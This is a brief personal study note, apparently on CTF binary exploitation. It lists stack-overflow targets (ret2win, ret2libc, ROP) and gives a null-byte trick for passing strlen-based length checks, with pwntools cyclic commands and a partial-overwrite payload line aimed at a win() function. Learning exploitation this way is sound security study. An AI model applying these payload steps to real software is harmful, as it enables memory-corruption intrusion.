## <span style="color:rgb(247, 145, 29)">Common targets for stack overflow:</span> 
- **ret2win:** `RIP -> win()`
- **ret2libc:** `RIP -> libc function`
- **ROP:** `RIP -> gadget -> gadget -> gadget`

## <span style="color:rgb(247, 145, 29)">Protections to check:</span> 
- COMMAND: `checksec ./binary`
![[Pasted image 20260923192050.png|563]]

# <span style="color:rgb(247, 145, 29)">Cyclic trick if input length is checked:</span> 
- You reach for this specific trick whenever you see a **length/validation check computed one way, but the actual data-copying operation controlled a different way** — and one of those two paths is null-byte-sensitive while the other isn't
- Pattern to look for:
```C
size_t len = strlen(buf);        // or strcpy, strcmp, sprintf with %s, etc.
if (len >= LIMIT) { ... reject ... }
...
memcpy(dest, buf, actual_byte_count);   // or read(), or an explicit length variable
```

Step 1) add a leading NULL byte before the cyclic:
```bash
r < <(printf '\x00'; pwn cyclic 200)
x/gx $rsp
cyclic -l <value>
```

Step 2) 
- `Real_offset = cyclic_offset + 1`

Step 3) Fix the payload (PIE example so we used p16):
```python
  payload = b"\x00" + b"A" * (offset - 1) + p16(win)
```